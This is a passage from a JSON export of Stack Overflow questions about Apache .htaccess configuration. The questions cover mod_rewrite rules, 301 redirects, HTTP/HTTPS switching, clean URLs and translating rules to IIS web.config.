questionmark","body":"<p>I have url</p>\n\n<p><a href=\"http://www.domain.com/folder/?variable=1\" rel=\"nofollow\">http://www.domain.com/folder/?variable=1</a></p>\n\n<p>i would like to do a mod redirect to index.cfm with the folder going in as path variable and the variable as the second variable.. the first three lines work with my site, i am having trouble with the last bit</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule (.*) /index.cfm?path=$1 [L]\nRewriteRule (.*)\\?(.*)$ /index.cfm?path=$1&amp;$2 [L]\n</code></pre>\n\n<p>thanks</p>\n"},{"tags":[".htaccess","redirect","dynamic-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12645311,"title":"htaccess redirecting from rewritten dynamic urls to new dynamic urls","body":"<p>i am experiencing a very unique problem and i hope someone can help!</p>\n\n<p>so we have recently created a new ecommerce website and we made it live and everything was working great but when we to implement our 301's from our old pages we were getting some wierd things</p>\n\n<p>so the code below actually works </p>\n\n<pre><code>Redirect 301 /directory/ http://mysite.com/index.php?cat=1\n</code></pre>\n\n<p>this code does not</p>\n\n<pre><code>Redirect 301 /directory/sub_directory/ http://mysite.com/index.php?cat=2\n</code></pre>\n\n<p>the output when i try to do this redirection is \"Invalid parameters specified!\" on a blank webpage and in the address bar it has this</p>\n\n<p><a href=\"http://mysite.com/index.php?cat=1/sub_directory/\" rel=\"nofollow\">http://mysite.com/index.php?cat=1/sub_directory/</a></p>\n\n<p>we were thinking that maybe the problem is because our old pages were dynamic but mod_rewrite was used to create more readable urls and we have also deleted all our old files because they were interfering with our new pages rendering</p>\n\n<p>any help would be greatly appreciated!</p>\n\n<p>thanks</p>\n"},{"tags":["html","regex",".htaccess","file-extension"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12638225,"title":"Automatically Rewrite html,php,css or any file extension using htaccess?","body":"<p>is there a way to automatically remove the file extension from the url?</p>\n\n<p>for ex:</p>\n\n<p>the user types </p>\n\n<pre><code>www.website.com/page.html\n</code></pre>\n\n<p>it will automatically convert the page to:</p>\n\n<pre><code>www.website.com/page\n</code></pre>\n\n<p>and if possible with a <code>/</code>:</p>\n\n<pre><code>www.website.com/page/\n</code></pre>\n\n<p>it must be automatic that the <code>.htaccess</code> will force the url to rewrite the file extension.</p>\n"},{"tags":[".htaccess","zend-framework","url","mod-rewrite","index"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12644290,"title":"Zend remove public/index.php/ from URL using mod_rewrite","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/11087790/zend-project-public-name-in-url\">Zend project public name in url</a>  </p>\n</blockquote>\n\n\n\n<p>I<code>m new to Zend and i</code>m trying to change the URL. My project is build with MVC, and my URL is like this:</p>\n\n<p>project/public/index.php/controller/action</p>\n\n<p>I want to be like:</p>\n\n<p>project/controller/action</p>\n\n<p>or</p>\n\n<p>project/public/controller/action is also acceptable.</p>\n\n<p>I already tried mod_rewrite using .htaccess, but i got no lucky.\nHere are the two rules that i have tried:</p>\n\n<pre><code>\" RewriteEngine on\nRewriteBase /\nRewriteRule !\\.(js|ico|txt|gif|jpg|png|css)$ index.php \"\n</code></pre>\n\n<p>and</p>\n\n<pre><code>\"RewriteEngine on\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /(.*)index\\.php(.*)\\ HTTP/ [NC]\nRewriteRule ^index\\.php(.*)$ /$1 [R=301,L]\" \n</code></pre>\n\n<p>Also, my .htacces file is under project/.htaccess and I`m not sure if it is correct.</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite","homepage"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":12633953,"title":"mod_rewrite Rules for Not Showing 'index/' on Home Page - PHP","body":"<p>I have seen lots on the subject but I can't seem to get this thing working like I want...</p>\n\n<p>I have this <code>.htaccess</code> file:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^([^/]+)/$ $1.php\n</code></pre>\n\n<p>And everything seems to work fine.  When I go to, for example</p>\n\n<pre><code>localhost/website\n</code></pre>\n\n<p>the contents from</p>\n\n<pre><code>localhost/website/index.php\n</code></pre>\n\n<p>are displayed.  This is expected.  My links are in variables in PHP, like so:</p>\n\n<pre><code>$home = 'index/'\n$contact = 'contact/'\n</code></pre>\n\n<p>etc, etc...</p>\n\n<p>So then I go to other links, click around a bit, and then click on the Home link and the URL is now this:</p>\n\n<pre><code>localhost/website/index/\n</code></pre>\n\n<p>which is what my <code>href</code> points to, so it's expected...  But I really want it to be:</p>\n\n<pre><code>localhost/website\n</code></pre>\n\n<p>So how do I use the variable <code>$home = '';</code> instead of <code>$home = index/';</code> and get what I want above?  I feel like Im missing something that should go in the <code>.htaccess</code> file.</p>\n\n<p>I guess I should also mention that the way my navigation works is I have a PHP loop that checks for current page in order to keep its graphic highlighted as opposed to not.</p>\n\n<p>This loop checks the page variables, eg <code>$home</code>, <code>$contact</code>, and if they are equal to the key value in an array full of page variables, then it use the highlighted set for links:  this has the effect of the page you're on having light colored buttons.</p>\n\n<p>The problem here is that for the index page, I'm using <code>'index/'</code> but I want to use <code>''</code> but this seems to not work.  It works when the conditional checks for <code>'index/'</code> but not when it checks for an empty string (<code>''</code>).</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>Here are some additional code snippets that may help my case:</p>\n\n<pre><code>// Navigation links\n$home           =   '';\n$contact_us     =   'contact/';\n\n// Button array\n$page_nav_lt = array(\n$home           =&gt;  $home_but_lt,\n$contact_us     =&gt;  $contact_but_lt\n);\n\n// Loop conditional (it's _alt below because it's a function in a class)\nif ($current_page == $key) {\n    $menu_output .= $image_dir . $ds . $page_nav_alt[$key];\n    $menu_output .= '\" id=\"alt\" class=\"data-id-yes';\n}\n</code></pre>\n"},{"tags":["http",".htaccess","ssl","https"],"answer_count":4,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":7917,"score":7,"question_id":1108706,"title":"Correctly switching between HTTP and HTTPS using .htaccess","body":"<p>We've got a shopping site which we're hosting on a shared host (Mediatemple Gridserver). Some parts of the site need to use HTTPS (checkout etc) but the rest should be using HTTP.</p>\n\n<p>Does anyone know how we can always force the correct use of HTTP/HTTPS for particular URLs? We've had it working in various states but we can't get a request for a page that should be on HTTP but is requested with HTTPS to switch back correctly.</p>\n\n<p>I've had a look around SO but couldn't find a suitable answer to this.</p>\n"},{"tags":["wordpress",".htaccess","url-rewriting","url-routing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12643657,"title":"Wordpress Multiple Site - Resource load problems","body":"<p>I have set up wordpress multi site option so I am able to create multiple blogs but the problem is resources don't load correctly.  Here is my <code>.htaccess</code>:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\n\n# uploaded files\nRewriteRule ^([_0-9a-zA-Z-]+/)?files/(.+) wp-includes/ms-files.php?file=$2 [L]\n\n# add a trailing slash to /wp-admin\nRewriteRule ^([_0-9a-zA-Z-]+/)?wp-admin$ $1wp-admin/ [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^ - [L]\nRewriteRule  ^[_0-9a-zA-Z-]+/(wp-(content|admin|includes).*) $1 [L]\nRewriteRule  ^[_0-9a-zA-Z-]+/(.*\\.php)$ $1 [L]\nRewriteRule . index.php [L]\n</code></pre>\n\n<p>So basically the problem is that these type of urls fail to load <code>my-site.com/my-blog/wp-includes/images/wpmini-blue.png</code>, but  when I remove <code>my-blog</code> from and paste the url in the browser it works perfect: <code>my-site.com/wp-includes/images/wpmini-blue.png</code>.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":139,"score":1,"question_id":9868313,"title":"mod_rewrite from .php to .html for web crawlers","body":"<p>I am using mod_rewrite in .htaccess to redirect from .php to .html like this: </p>\n\n<pre><code>RewriteRule ^([^.]+).html$ /$1.php [QSA,L]\n</code></pre>\n\n<p>It works in a web browser, but <strong>Google is crawling the old URLs</strong> i.e. <code>index.php</code> and <code>faq.php</code>. </p>\n\n<p>How I can redirect the <code>index.php</code> to <code>index.html</code>? My website URL is: <a href=\"http://www.21flats.com/\" rel=\"nofollow\">http://www.21flats.com/</a>.</p>\n"},{"tags":[".htaccess","rewrite","http-status-code-404","rule"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12639824,"title":"htaccess - rewriting rules","body":"<p>Google Webmaster tools gives me a hint that I have 2 pages with the exact same content.</p>\n\n<p>For example:</p>\n\n<pre><code>/airports/romania/115.php\n/airports/romania/115.phphey1\n</code></pre>\n\n<p>In the htacces file i have this: </p>\n\n<pre><code>RewriteRule airports/(.*)/([0-9]{1,}).php airports_list.php?airport=$2&amp;country_air=$1\n</code></pre>\n\n<p>I've checked and double checked and triple checked all my code in airports_list.php and every other file on the server. I can't find \"hey1\" anywhere.</p>\n\n<p>In order to solve my problem, I think I have to redirect a link like www.mydomain.com/airports/romania/115.phphey1 to a 404 page.</p>\n\n<p>How do I do that ?</p>\n\n<p>The following is also working inside my .htaccess file :</p>\n\n<pre><code>ErrorDocument 404 http://www.mydomain.com/404.php \n</code></pre>\n"},{"tags":["php",".htaccess","routing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":42,"score":1,"question_id":12641456,"title":"How to remove client id from url with htaccess?","body":"<p>I'm creating urls like:</p>\n\n<p><a href=\"http://domain.com/app/\" rel=\"nofollow\">http://domain.com/app/</a><strong>clientID</strong>/controller/\nor\n../app/<strong>clientID</strong>/filename.ext</p>\n\n<p>I need to remove alphanumeric clientID from the URL.</p>\n\n<p>My current htacces is:</p>\n\n<blockquote>\n  <p>RewriteRule ^app/([a-z0-9]+)<em>/(.</em>)$ /app/$2 [NC,L]</p>\n</blockquote>\n\n<p>It passes the htaccess tester, but I get 404 error in the web.</p>\n\n<p>Sample: <a href=\"http://domain.com/app/gmcpoujth7/js/fancybox/jquery.fancybox-1.3.4.pack.js\" rel=\"nofollow\">http://domain.com/app/gmcpoujth7/js/fancybox/jquery.fancybox-1.3.4.pack.js</a></p>\n\n<p>What am I doing wrong ?</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":10475122,"title":"How do I force the browser download all file types in a directory using .htaccess?","body":"<p>How would I tell the browser to force download all file types in a directory instead of rendering them inside the browser?\nI've tried this but it didn't work.</p>\n\n<pre><code>&lt;Files *.*&gt;\nForceType applicaton/octet-stream\n&lt;/Files&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":12641521,"title":"htacces: how to rewrite URL only on a certain domain?","body":"<p>I have a small hosting company,</p>\n\n<p>I want my main hosting domain to work with \"www.\" always therefor I have this in HTACCESS:</p>\n\n<pre><code># Redirect non-www urls to www\nRewriteEngine on\nRewriteCond %{HTTP_HOST} !^www\\.givun\\.co\\.il\nRewriteRule (.*) http://www.givun.co.il/$1 [R=301,L]\n</code></pre>\n\n<p>The problem is that I also have other domain parked that this script screws up the \ncontent that's delivered to them, it basically delivers the homepage.</p>\n\n<p>Can this code be changed so that it rewrites only on the givun.co.il domain \nand not on parked domains?</p>\n\n<p>any help would be appreciated,</p>\n"},{"tags":["jquery","apache",".htaccess","hash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12641210,"title":"how can i use literal # in .htacces?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3585019/need-to-escape-hash-pound-character-in-htaccess-rewrite-rule\">need to escape # (hash/pound) character in .htaccess rewrite rule</a>  </p>\n</blockquote>\n\n\n\n<p>i have this code in my .htaccess</p>\n\n<pre><code>   RewriteEngine On\n   RewriteCond %{REQUEST_FILENAME} !-f\n   RewriteCond %{REQUEST_FILENAME} !-d\n   RewriteRule ^([^/]*)/([^/]*)/$ $1_$2.php#$1\n</code></pre>\n\n<p>I need to use the # as anchor of the page,but .htacces reads # like the beginning of a comment, and it breaks the link, how can I solve this? how can i use literally the #?</p>\n"},{"tags":["php",".htaccess","clean-urls"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":42,"score":2,"question_id":12640288,"title":".htaccess/php cleanURL's variable number of variables in a variable order","body":"<p>I've found a number of solutions on stackoverflow on rewriting urls with a variable number of variables. But wasn't able to find anything on the situation where these variables can occur in a variable order. In my case I've a page with 4 potential variables:</p>\n\n<pre><code>www.domain.com/page.php?a=var1&amp;b=var2&amp;c=var3&amp;d=var4\n</code></pre>\n\n<p>I want my users to be able to access this as:</p>\n\n<pre><code>www.domain.com/page/var1/var2/var3/var4\n</code></pre>\n\n<p>So far I was able to do this with htaccess. But the problem is that not all the variables occur anytime. I want Url's like these be possible:</p>\n\n<pre><code>www.domain.com/page/var1/var2/var4\nwww.domain.com/page/var1/var4\nwww.domain.com/page/var1/var3\netc.\n</code></pre>\n\n<p>I think this is not possible with htaccess. But what would be the most elegant solution to use clean Url's on this one.</p>\n\n<p>Hope anyone has any ideas...</p>\n"},{"tags":[".htaccess","zend-framework","mod-rewrite","socialengine"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12638082,"title":"How can I create user-friendly URLs in the SocialEngine Group plugin?","body":"<p>I have a Socialengine-based website with the Groups plugin and I would like to change the display of the Group links to more SEO friendly links.</p>\n\n<p>For example, I would like to change the following:</p>\n\n<pre><code>http://www.example.com/groups?category_id=16 to http://www.example.com/golf\n\nand\n\nhttp://www.example.com/group/76 to http://www.example.com/golf/ryder-cup.\n</code></pre>\n\n<p>In other words, I'd like to use the category/group names instead of the category/group ids. There won't be a problem with duplicates because only I will be creating categories and groups so I can avoid this problem.</p>\n\n<p>From what I can tell, mod_rewrite is the way to go with this, but I've tried and tried and can't get anything to work. For example, to test if rewriting will even work at a basic level (i.e. not even swapping ids for names), I added the following rule to the below .htaccess file: RewriteRule ^sports/([0-9]+)$ groups?category_id=$1 [L] but I just got a \"Page not found error\" when using the URL <a href=\"http://www.example.com/sports/16\" rel=\"nofollow\">http://www.example.com/sports/16</a>.</p>\n\n<p>This is my .htaccess file, located at root level:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  Options +FollowSymLinks\n  RewriteEngine On\n\n  # Get rid of index.php\n  RewriteCond %{REQUEST_URI} /index\\.php\n  RewriteRule (.*) index.php?rewrite=2 [L,QSA]\n\n  # Rewrite all directory-looking urls\n  RewriteCond %{REQUEST_URI} /$\n  RewriteRule (.*) index.php?rewrite=1 [L,QSA]\n\n  # Try to route missing files\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} public\\/ [OR]\n  RewriteCond %{REQUEST_FILENAME} \\.(jpg|gif|png|ico|flv|htm|html|php|css|js)$\n  RewriteRule . - [L]\n\n  # If the file doesn't exist, rewrite to index\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteRule ^(.*)$ index.php?rewrite=1 [L,QSA]\n\n&lt;/IfModule&gt;\n\n# sends requests /index.php/path/to/module/ to \"index.php\"\n# AcceptPathInfo On\n\n# @todo This may not be effective in some cases\nFileETag Size\n</code></pre>\n\n<p>Can anyone help?</p>\n\n<p>Thanks in advance</p>\n\n<p>Andy</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","slash"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":22,"score":2,"question_id":12637622,"title":"Rewrite rule not showing slash to users & show slash for script","body":"<p>I'm in situation when CMS creates duplicates. Every page can be opened with slash at the end and without.</p>\n\n<p>So I need to rewrite physically every URL for Search Engine and people with 301 redirect to condition when it's without slash at the end.</p>\n\n<p>But the problem is the script then stops working because it works only with slashes at the URLs' end.</p>\n\n<p>I've made logically this .htaccess</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^(.*)/$ [NC]\nRewriteRule ^(.*)(/) $1 [R=301,L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_URI} !(.*)/$\nRewriteRule ^(.*[^/])$ $1/ [L]\n</code></pre>\n\n<p>But it's getting redirect loop. Please could you help me to write it correct. The main purpose that users and SE should see no end-slash URL but script needs on the server internally rewritten URL with end-slash.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":12637257,"title":"Redirect with htaccess; 404 error without backslash","body":"<p>I have a page on my website;</p>\n\n<p><code>page.php</code> and I want it to accessible through <code>example.com/folder/page/</code>. I use the following  htaccess code for that:</p>\n\n<pre><code>RewriteRule ^page$ page.php [NC,L] #remove .php\nRewriteRule ^folder/page/$ http://www.example.com/page\n</code></pre>\n\n<p>And this works. If I navigate to <code>example.com/folder/page/</code> I get shown the right page. The problem is, when I visit <code>example.com/folder/page</code> (no <code>/</code>) I get a 404 error. How would I fix this?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12636221,"title":"redirection of non-existing folder mod_rewrite","body":"<p>How can i redirect a certain url request like:</p>\n\n<p><a href=\"http://sample.org/www/images/animal.png\" rel=\"nofollow\">http://sample.org/www/images/animal.png</a></p>\n\n<p>file structure:</p>\n\n<p>rootpath/images/animal.png</p>\n\n<p>rootpath/www/</p>\n"},{"tags":["apache","iis",".htaccess","web-config","webserver"],"answer_count":4,"favorite_count":4,"up_vote_count":8,"down_vote_count":0,"view_count":5971,"score":8,"question_id":702526,"title":"Translating an Apache .htaccess file to an IIS web.config","body":"<p><br />\nI developed an application on my local using PHP, MySQL and Apache and it has a .htaccess file containing this:</p>\n\n<pre><code>#Setting the default handler.\n  DirectoryIndex home.do\n\n&lt;IfModule mod_mime.c&gt;\n  #Supporting .do extensions    \n     AddType application/x-httpd-php .do\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_rewrite.c&gt;\n  #Removing .do file extension if necessary\n     RewriteEngine on\n     RewriteCond %{REQUEST_FILENAME} !-d\n     RewriteCond %{REQUEST_FILENAME}\\.do -f\n     RewriteRule ^(.*)$ $1.do\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>But I informed that my customer's web server is IIS and I have to use a web.config file instead of .htaccess. Can anyone direct me through this, please?</p>\n"},{"tags":[".htaccess","url","mod-rewrite","directory","structure"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12633340,"title":"rewrite rule to remove a folder from a path and keep rest of directory structure","body":"<p>In my base directory I have a lot of folders. I would like to put these folders into a sub-directory.</p>\n\n<p>domain.com/test/test.html</p>\n\n<p>would have the file structure:</p>\n\n<p>domain.com/subdir/test/test.html</p>\n\n<p>and still be at the same url: domain.com/test/</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^(www.)?domain.com$\nRewriteCond %{REQUEST_URI} !^/subdir/\nRewriteRule ^(.*)$ /subdir/$1 [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n</code></pre>\n\n<p>Copied from another answer here does that but it also stops other requests to the base directory.</p>\n\n<p>I need it to check for foldername matches in the subdir and if it exists or if not serve from base directory.  </p>\n"},{"tags":[".htaccess","magento","mod-rewrite","links"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12629183,"title":"moved domain name - only home page works","body":"<p>I moved a site to a magento new domaine name.\nHome page works well but all the links give 404.</p>\n\n<p>I verified that \"*LoadModule rewrite_module modules/mod_rewrite.so*\" is enabled in httpd.conf</p>\n\n<p>.htaccess has this entry:</p>\n\n<pre><code>## rewrite everything else to index.php\nRewriteRule .* index.php [L]\n</code></pre>\n\n<p><strong>old site</strong></p>\n\n<pre><code>http://old_site.com/                    &lt;&lt; this works\nhttp://old_site.com/en/contentpage.html         &lt;&lt; this works\n</code></pre>\n\n<p><strong>new site</strong></p>\n\n<pre><code>http://newsite.com/shop1/en\nhttp://newsite.com/shop1/en/contentpage.html     &lt;&lt; this is a typical link from the home page                                    \n                                                 &lt;&lt; link from new site takes me here, but this gives 404 error\n\nhttp://newsite.com/shop1/index.php/en/contentpage.html  &lt; this link, however, does works\nhttp://newsite.com/shop1/en/contentpage.html            &lt;&lt; link from new site takes me here, but this gives 404 error\n</code></pre>\n\n<p>.</p>\n"},{"tags":["http",".htaccess","redirect","https"],"answer_count":2,"favorite_count":5,"up_vote_count":2,"down_vote_count":0,"view_count":3734,"score":2,"question_id":2015159,"title":"htaccess redirect for non-www both http and https","body":"<p>Not sure if this is possible in a single .htacess file, but ideally, I'd like to have:</p>\n\n<ul>\n<li><em>http://example.com</em> redirect to: <em>http://www.example.com</em></li>\n<li><em>https://example.com</em> redirect to: <em>https://www.example.com</em></li>\n</ul>\n\n<p>And anything that is <em>http://whatever.example.com</em> NOT append the www like <em>http://www.whatever.example.com</em>.</p>\n\n<p>Is this possible?</p>\n\n<p>Thanks,\nD.</p>\n"},{"tags":["php",".htaccess","web-config"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":974,"score":0,"question_id":2079932,"title":"Help translating .htaccess to web.config url rewrite","body":"<p>What would this rewrite rule from .htaccess translate to IIS7 web.config?</p>\n\n<p>RewriteRule .* index.php/$0 [PT,L]</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","http-status-code-500"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12629619,"title":"How do I avoid a 500 error with .php hiding using mod_rewrite?","body":"<p>I have got this in my .htaccess file:</p>\n\n<pre><code>    ErrorDocument 403 /403.php\n    ErrorDocument 404 /404.php\n    Options -MultiViews\n    RewriteEngine On\n    RewriteBase /\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ $1.php [L]\n</code></pre>\n\n<p>When I try to access a page or directory that isn't there, I get 'Error 500 - internal server error'. I am using GoDaddy, if it is relevant.</p>\n"},{"tags":[".htaccess","bots","robots"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12605065,"title":"disallow search engine bots, spiders, crawlers for a special directory with htaccess","body":"<p>Sorry my bad english. But not use robots.txt because my special directory name displayed in robots.txt.</p>\n"},{"tags":["php",".htaccess","mod-rewrite","seo"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12623733,"title":"using htaccess for good SEO links","body":"<p>I building a Web forum whose link looks like this :</p>\n\n<pre><code>http://127.0.0.1/website/comments.php?topic_id=2/create+good+seo+links\n</code></pre>\n\n<p>The link generating the link looks like this</p>\n\n<pre><code>&lt;a href=\"comments.php?topic_id=&lt;?php echo (int)($forum_topic['topic_id']); &gt;/&lt;?php echo urlencode(htmlspecialchars($forum_topic['topic_head'])); &gt; \"&gt;\n</code></pre>\n\n<p>Question: How can I make the link look like </p>\n\n<pre><code>http://127.0.0.1/website/comments/topic/create-good-seo-links/2\n</code></pre>\n\n<p>I tried apply this code in .htaccess file :</p>\n\n<pre><code>   RewiteEngine on\n   RewriteBase /website\n   RewriteRule ^comments/([a-zA-Z0-9_-)/([0-9]+)\\.php$ comments.php?id=$1\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","amazon-ec2","suse"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12612481,"title":"htaccess is not being recognized on ec2 suse instance web server","body":"<p>Alright here's the deal: my .htaccess file is not working at all</p>\n\n<p>My server setup is SuSE on an Amazon EC2 Instance\n- Apache is setup, mod_rewrite is loaded and enabled\n- In my http.conf I have:</p>\n\n<pre><code>&lt;Directory /&gt;\n    Options None\n    AllowOverride All\n    Order deny,allow\n    Deny from all\n&lt;/Directory&gt;\n\n&lt;Directory /srv/www/htdocs/&gt;\n  AllowOverride All\n&lt;/Directory&gt;\n\n# use .htaccess files for overriding,\nAccessFileName .htaccess\n# and never show them\n&lt;Files ~ \"^\\.ht\"&gt;\n    Order allow,deny\n    Deny from all\n&lt;/Files&gt;\n</code></pre>\n\n<ul>\n<li><p>On the server I have CI install, .htacces does nothing it's supposed too. For example, to test to see if it works I created a .htacess that says 'deny from all', was still able to access the pages.</p></li>\n<li><p>I have restarted apache each time I made a change to the configuration file.</p></li>\n</ul>\n\n<p>What could be causing my htaccess files not be recognized? </p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":11,"down_vote_count":0,"view_count":73,"score":11,"question_id":12620926,"title":"stop htaccess redirect","body":"<p>I accessed a 'superfolder's .htaccess file and accidentally added</p>\n\n<pre><code>Rewrite / http://google.com/\n</code></pre>\n\n<p>This was done using php. Now I can't access php files in any directory to revert the change.</p>\n\n<p>Is there anything I can do in a subdirectory of root to stop the redirect inside that folder?</p>\n\n<p>Thank you. </p>\n\n<p>And please don't ask more details about the 'accident'.. stupid mistake</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":156,"score":0,"question_id":4917298,"title":"allow access to specific subdir via .htaccess","body":"<p>In the parent directory of my site I have in the <code>.htaccess</code>:</p>\n\n<p>Options All -Indexes</p>\n\n<p>Now in <code>parent_dir/images/uploaded/</code> I want to allow people to view this. How do I do this?</p>\n"},{"tags":["apache",".htaccess","browser-cache","mod-expires"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12626011,"title":"Expires directive - modification base VS Access base","body":"<p>From what I know this:</p>\n\n<pre><code>ExpiresByType text/html \"access plus 30 days\"\n</code></pre>\n\n<p>will make the browser cache request for fresh content after storing the content die 30 days. </p>\n\n<p>But with:</p>\n\n<pre><code>ExpiresByType text/html \"modification plus 30 days\"\n</code></pre>\n\n<p>the browser cache will know with the help of LAST MODIFIED HEADER not to request for fresh content until 30 days of modification.</p>\n\n<p>So my question is, <strong>why not use Modification Base all the time as it seems to make better sense or is there something I am missing?</strong></p>\n"},{"tags":[".htaccess","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1033,"score":0,"question_id":3717799,"title":"Redirecting HTTPS to HTTP via .htaccess","body":"<p>I'm using a WordPress with its default .htaccess and I need to redirect all urls starting with https:// to http://. My server is using the same folder for http and https protocols...\nthis is my current .htaccess:</p>\n\n<pre><code># BEGIN WordPress &lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase \nRewriteCond %{REQUEST_FILENAME} !-f\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L] &lt;/IfModule&gt; \n# END WordPress\n\nOptions +FollowSymlinks\nRewriteEngine On\nRewriteCond %{SERVER_PORT} ^443$\nRewriteRule ^(.*)$ http://%{HTTP_HOST}/$1 [R=301,L]\n</code></pre>\n\n<hr>\n\n<p>It works fine for <a href=\"https://www.domain.com/\" rel=\"nofollow\">https://www.domain.com/</a> (redirects to <a href=\"http://www.domain.com/\" rel=\"nofollow\">http://www.domain.com/</a>) but it doesn't work with <a href=\"https://www.domain.com/subpages/\" rel=\"nofollow\">https://www.domain.com/subpages/</a> (it also redirects to <a href=\"http://www.domain.com/\" rel=\"nofollow\">http://www.domain.com/</a>).</p>\n\n<p>Do you see any problem in .htaccess please?</p>\n\n<p>Thank you</p>\n"},{"tags":["wordpress","apache",".htaccess","redirect","cpanel"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12626597,"title":"www.domain.com is not working but domain.com is working to redirect to a wordpress page","body":"<p>I am trying to redirect an add-on domain to a certain wordpress page but the domain.com is working (redirecting to that wordpress page) but the www.domain.com is not loading the redirect.</p>\n\n<p>Here is my set up:</p>\n\n<p>domain101.net is registered at namecheap.com <br/>\ndomain101.net is added as an add-on domain to our HOSTING Server</p>\n\n<p>at NameCheap.com I changed the nameserver from namecheap.com to our hosting server nameserver</p>\n\n<p>at our HostingServer I use redirect, as I mentioned above, </p>\n\n<p>domain101.net --> redirectdomain.com/pagename</p>\n\n<p>www.domain101.net --> redirectdomain.com/pagename sadly, when www is used the redirect is not working.</p>\n\n<p>Here is my htaccess generated by CPANEL REDIRECT.</p>\n\n<pre><code>      RewriteCond %{HTTP_HOST} ^domain101\\.net$ [OR]\n      RewriteCond %{HTTP_HOST} ^www\\.domain101\\.net$\n      RewriteRule ^(.*)$ \"http\\:\\/\\/www\\.redirectdomain\\.com\\/page1\\-  subpage\\/pagename\\/$1\" [R=301,L]\n</code></pre>\n\n<p>What I am missing here, why I can't get www.domain101.net not to work? I assumed that both domain101.net and www.domain101.net will work as one.</p>\n\n<p>Any input is gladly appreciated,</p>\n\n<p>Best 